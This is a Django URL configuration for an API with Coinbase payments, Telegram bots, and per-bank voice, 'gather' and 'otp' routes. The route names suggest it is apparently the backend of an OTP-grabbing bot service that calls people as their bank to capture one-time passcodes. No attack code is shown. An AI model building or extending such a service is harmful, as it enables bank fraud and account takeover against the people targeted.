from django.urls import path
from . import views



urlpatterns=[
    path('balance/', views.BalanceListView.as_view(), name='api_balance'),
    path('add/', views.CoinbasePaymentView.as_view(), name="coinbase"),
    path('buy/<int:pk>/', views.BuyView.as_view(), name='api_buy'),
    path('decrypt/<int:pk>/', views.DecryptView.as_view(), name='api_decrypt'),
    path('receive/', views.CoinbaseWebhookView.as_view(), name='coinbase_webhook'),
    path('create/telegram/', views.TelegramClientCreateView.as_view(), name='telegram_client_create'),
    path('telegram/receive/', views.TelegrambaseWebhookView.as_view(), name='telegram_webhook'),
    path('bot/create/', views.TelegramOtpBotCreateView.as_view(),name="otp_create"),
    path('bot/receive/', views.TelegrambotWebhookView.as_view(), name="otp_bot"),
    path('call/trial/', views.CallTrial.as_view(), name='call_trial'),
    path('security/', views.SecurityCheck.as_view(), name='security'),
    path('voice/<str:bank>/<str:chat_id>/', views.voice, name='voice'),
    path('gather/<str:chat_id>/<str:bank>/', views.gather, name='gather'),
    path('otp/<str:chat_id>/<str:bank>/', views.choice, name="choices")
]